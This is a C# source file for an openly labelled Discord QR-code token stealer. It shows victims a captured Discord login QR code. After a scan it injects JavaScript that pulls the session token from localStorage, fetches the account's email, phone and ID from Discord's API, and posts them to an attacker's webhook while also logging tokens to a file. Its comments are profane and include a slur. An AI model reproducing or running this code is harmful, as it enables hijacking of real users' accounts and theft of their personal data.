using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using CefSharp;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Net;
using Newtonsoft.Json;
using System.Diagnostics;
using System.Text;
using System.Linq;

namespace Discord_QR_Token_Stealer
{
    public partial class qrGrabber : Form
    {
        // stupid shit
        public bool createdQr = false;
        
        public TokenInformation tokenInfo = null;

        public static string webhookUrl = string.Empty;
        public List<string> loggedTokens = new List<string>();

        public System.Windows.Forms.Timer timeLeftTimer = new System.Windows.Forms.Timer();
        public TimeSpan timeLeft;
        public DateTime timeStart;
        public DateTime timeEnd;
        public int num = 0;

        // init
        public qrGrabber()
        {
            InitializeComponent();
        }

        // onload code
        private void qrGrabber_Load(object sender, EventArgs e)
        {
            // if console.log exists, delete it
            if (File.Exists("console.log"))
                File.Delete("console.log");

            // import webhooks
            if (File.Exists("webhook.txt"))
                webhookUrl = File.ReadAllText("webhook.txt");

            // delete the prev ones
            foreach (var file in Directory.GetFiles("."))
                if (file.Contains("finalized"))
                    File.Delete(file);

            timeLeftTimer.Interval = 1000;
            timeLeftTimer.Tick += (a, b) =>
            {
                timeLeft = timeEnd - DateTime.UtcNow;

                if (timeLeft.TotalSeconds <= 0)
                    return;

                lblTimeLeft.Invoke((MethodInvoker)(() =>
                {
                    lblTimeLeft.Text = $"{Math.Round(timeLeft.TotalSeconds)} seconds until expiration";
                }));
            };
        }

        void resetTimer()
        {
            timeStart = DateTime.UtcNow;
            timeEnd = timeStart.AddMinutes(2);
        }

        // inject code to get the QR code
        void injectCode()
        {
            // countdown timer
            resetTimer();
            timeLeftTimer.Start();

            // sleep for rendering shit
            Thread.Sleep(1000);
            chromiumWebBrowser1.ExecuteScriptAsync("console.log(document.getElementsByTagName('img')[0].src)");
        }

        void accountLoggedIn()
        {
            timeLeftTimer.Stop();
            chromiumWebBrowser1.EvaluateScriptAsync("var s=document.createElement('iframe');s.style.display='none';document.body.appendChild(s);console.log('token;'+s.contentWindow.localStorage.token);");

            // clear out the side panel to template.png
            currentCode.Load("template.png");
            createLog("Changed current code to template.png because of log in");
        }

        // change a base64 string back into a png and save it
        void base64ToPng(string inp)
        {
            var bytes = Convert.FromBase64String(inp.Substring(22));
            var img = new FileStream("rawcode.png", FileMode.Create);
            img.Write(bytes, 0, bytes.Length);
            img.Close();

            // create the final image
            createFinalImage();

            Debug.WriteLine("Exported base64 to rawcode.png");
        }

        // query discord api for token details (email, phone, tag, id, etc)
        dynamic getTokenDetails(string token)
        {
            try
            {
                // casted as httpwebrequest because i couldnt set user agent without error, fuck you
                var client = WebRequest.Create("https://discord.com/api/v9/users/@me");
                client.Headers.Add("authorization", token);
            
                // lazy work right here
                var json = JsonConvert.DeserializeObject<TokenInformation>(new StreamReader(client.GetResponse().GetResponseStream()).ReadToEnd());
                json.Token = token;

                // replace null phone number with "not registered"
                if (json.Phone == null)
                    json.Phone = "Not registered";

                return json;
            } catch (Exception ex)
            {
                // even more lazy work
                Debug.WriteLine(ex);
                return null;
            }
        }

        // create the final image
        void createFinalImage()
        {
            try
            {
                // load template file into picturebox
                currentCode.Image = Image.FromFile("template.png");

                // qr code
                var top = Image.FromFile("overlay.png");
                var qr = Image.FromFile("rawcode.png");
                var grap = Graphics.FromImage(qr);
                //grap.DrawImage(top, (qr.Width / 2) - (top.Width / 2), (qr.Height / 2) - (top.Height / 2));
                grap.DrawImage(top, (top.Width / 2), (top.Height / 2));

                // final image
                var temp = Image.FromFile("template.png");
                var grap2 = Graphics.FromImage(temp);
                grap2.DrawImage(qr, 120, 409);

                // GOD FUCKING DAMN IT
                // fuck all this shit
                // extra hour i was up fixing stupid ass fucking GDI issues, go fuck yourself
                // fucking deal with this autistic code
                try
                {
                    temp.Save($"finalized-{num}.png");
                    temp.Dispose();

                    if (File.Exists($"finalized-{num-2}.png"))
                        File.Delete($"finalized-{num-2}.png");
                }
                catch (Exception ex){ Debug.WriteLine(ex); }


                // set image to qr
                currentCode.Image = Image.FromFile($"finalized-{num}.png");
                
                // dispose images
                top.Dispose();
                qr.Dispose();

                // dispose graphics
                grap.Dispose();
                grap2.Dispose();

                // show message box if not first time
                //if (createdQr)
                //    MessageBox.Show("Previous QR code expired, new one has been generated", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                createdQr = true;
                num++;
            } catch (Exception ex)
            {
                Debug.WriteLine(ex);
            }
        }

        void updateInfo(string token)
        {
            if (loggedTokens.Contains(token))
                return; 

            // token information frm token supplied
            tokenInfo = getTokenDetails(token);

            // invoke it cause im too lazy to check if its required or not
            lblToken.Invoke((MethodInvoker)(() =>
            {
                // setting data, substrings are for proper formatting
                lblToken.Text = token;
                lblTag.Text = $"{tokenInfo.Username}#{tokenInfo.Discriminator}";
                lblId.Text = tokenInfo.Id;
                lblPhone.Text = tokenInfo.Phone;
                lblEmail.Text = tokenInfo.Email;
            }));

            // add to the logged toksn list so taht it doesnt send multiple hooks
            loggedTokens.Add(token);

            // send the webhook
            sendWebhook();

            // add to uniques.txt
            addToUniques(token);
        }

        // says its loaded
        private void chromiumWebBrowser1_IsBrowserInitializedChanged(object sender, EventArgs e)
        {
            // clear labels n shit
            clearInfo();

            // load discord login
            chromiumWebBrowser1.Load("https://discord.com/login");

            // register console message event
            chromiumWebBrowser1.ConsoleMessage += (source, msg) =>
            {
                // more lazy coding
                if (msg.Message.Contains("handshake complete awaiting remote auth"))
                    injectCode();
                else if (msg.Message.StartsWith("data:image/png;base64,"))
                    base64ToPng(msg.Message);
                else if (msg.Message.StartsWith("token;"))
                    updateInfo(msg.Message.Substring(7, msg.Message.Length - 8));

                //File.AppendAllText("console.log", $"{msg.Message}\n");
                createLog(msg.Message);
            };
        }

        // clicking on side image
        private void currentCode_Click(object sender, EventArgs e)
        {
            // make sure its not just null
            if (currentCode.Image == null)
                return;

            // copying to clipboard
            Clipboard.SetImage(currentCode.Image);
        }

        // if the address has changed and its not the login page anymore, congrats, youve done something i suppose
        private void chromiumWebBrowser1_AddressChanged(object sender, AddressChangedEventArgs e)
        {
            // about the laziest i can get i think
            if (chromiumWebBrowser1.Address != "https://discord.com/login")
            {
                accountLoggedIn();
            }
        }

        // click on one of the 5 labels, copy the content
        private void copyControlText_Click(object sender, EventArgs e)
        {
            // i kinda hate this
            var text = sender.GetType().GetProperty("Text");
            Clipboard.SetText(text.GetValue(sender).ToString());
            createLog($"Copied {sender.GetType().GetProperty("Text").GetValue(sender)} to clipboard");
        }

        private void exportInfo_Click(object sender, EventArgs e)
        {
            // make sure it exists
            if (tokenInfo == null)
            {
                // fuck u
                MessageBox.Show("No token has been logged to check!");
                return;
            }

            // bruh
            if (!Directory.Exists("exports"))
                Directory.CreateDirectory("exports");

            // its 6:30 am help
            File.WriteAllText($"exports/{tokenInfo.Id}.txt", JsonConvert.SerializeObject(tokenInfo, Formatting.Indented));

            // create log
            createLog($"Exported information to exports/{tokenInfo.Id}.txt");
        }

        // reload button
        private void reloadPage_Click(object sender, EventArgs e)
        {
            clearInfo();
        }

        // fix maybe??
        // seems to work
        private void qrGrabber_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

        private void info_Click(object sender, EventArgs e)
        {
            new infoPanel().Show();
        }

        private void setHook_Click(object sender, EventArgs e)
        {
            new setHook().ShowDialog();
            File.WriteAllText("webhook.txt", webhookUrl);
        }

        // this sends the webhook to discord
        void sendWebhook()
        {
            // make sure the webhook is valid
            if (webhookUrl == string.Empty)
            {
                createLog("Skipping webhook, no URL supplied");
                return;
            } else if (!webhookUrl.Contains("https://discord.com/api/webhooks/"))
            {
                createLog("Skipping webhook, invalid webhook URL");
                return;
            }
            
            // make sure token is valid
            if (tokenInfo == null)
            {
                createLog("Skipping webhook, token information was null");
                return;
            }

            // if the tokenInfos avatar is null, replace it with sniffcat
            string av;
            if (tokenInfo.Avatar == null)
                av = "https://raw.githubusercontent.com/verlox/Discord-QR-Token-Logger/master/Discord-QR-Token-Stealer/sniffcat.jpg";
            else
                av = $"https://cdn.discordapp.com/avatars/{tokenInfo.Id}/{tokenInfo.Avatar}.png";

            // crash prevention
            try
            {
                // the actual body in JSON format
                var body = "{\"embeds\":[{\"title\":\"Token grabbed from " + $"{tokenInfo.Username}#{tokenInfo.Discriminator}" + "!\",\"description\":\"`" + tokenInfo.Token + "`\",\"color\":\"7407103\",\"thumbnail\":{\"url\":\"" + av + "\"},\"fields\":[{\"name\": \"ID\", \"value\": \"" + tokenInfo.Id + "\"},{\"name\":\"Email\",\"value\":\"" + tokenInfo.Email + "\"},{\"name\":\"Phone\",\"value\":\"" + tokenInfo.Phone + "\"}],\"timestamp\":\"" + DateTime.Now.ToUniversalTime().ToString("o") + "\",\"footer\":{\"text\":\"made by verlox.cc\"}}],\"avatar_url\":\"https://raw.githubusercontent.com/verlox/Discord-QR-Token-Logger/master/Discord-QR-Token-Stealer/sniffcat.jpg\",\"username\":\"lithhook\"}";

                // log body to debug
                Debug.WriteLine(body);

                // make request and set settings
                var req = WebRequest.Create(webhookUrl);
                req.Method = "POST"; // POST request, very important
                req.ContentType = "application/json";

                // convert to bytes so we can write it as the body, stream.write requires bytes
                var bytes = Encoding.UTF8.GetBytes(body);
                req.GetRequestStream().Write(bytes, 0, bytes.Length);

                // get response
                var res = new StreamReader(req.GetResponse().GetResponseStream()).ReadToEnd();
                Debug.WriteLine(res);

                // create a log
                createLog($"Sent webhook, Discord returned: {res}");
            } catch (Exception ex)
            {
                Debug.WriteLine(ex);
                createLog($"Failed to send webhook: {ex.Message}");
            }
        }

        // create a log in the logbox, use this method so that we dont keep checking if invoke is required and shit
        void createLog(string text)
        {
            // if required, invoke it, else, just add it
            if (logBox.InvokeRequired)
            {
                logBox.Invoke((MethodInvoker)(() =>
                {
                    logBox.Items.Add(text);
                    logBox.SelectedIndex = logBox.Items.Count - 1;
                }));
            } else
            {
                logBox.Items.Add(text);
                logBox.SelectedIndex = logBox.Items.Count - 1;
            }
        }

        // clear labels and reset timer
        void clearInfo()
        {
            // more lazy crash protection
            try
            {
                // reload page
                chromiumWebBrowser1.Load(chromiumWebBrowser1.Address);

                // clear out the labels
                lblTag.Text = "Tag";
                lblEmail.Text = "Email";
                lblId.Text = "Id";
                lblPhone.Text = "Phone";
                lblToken.Text = "Token";

                // clear out the picturebox
                currentCode.Load("template.png");

                // clear cookies
                var cookieManager = chromiumWebBrowser1.GetCookieManager();
                cookieManager.DeleteCookies();

                createLog($"Purged browser cookies.");
            }
            catch (Exception ex)
            {
                createLog($"Failed to delete cookies: {ex.Message}");
                try { chromiumWebBrowser1.Load("https://discord.com/login"); } catch { }
            }
        }

        public void addToUniques(string token)
        {
            // instantiate new list
            var tokens = new List<string>();

            // make sure it exists, if it does, read it to tokens var
            if (File.Exists("unique.txt"))
                tokens = File.ReadAllLines("unique.txt").ToList();

            // if its not already in there, then add it
            if (!tokens.Contains(token))
            {
                // add it to the file
                File.AppendAllText("unique.txt", $"{token}\n");
                createLog("Updated unique.txt");
            }
        }
    }

    // class that data from tokens gets imported into
    public class TokenInformation
    {
        public string Token;
        public string Id;
        public string Username;
        public string Discriminator;
        public string Email;
        public string Phone;
        public string Avatar;
    }
}
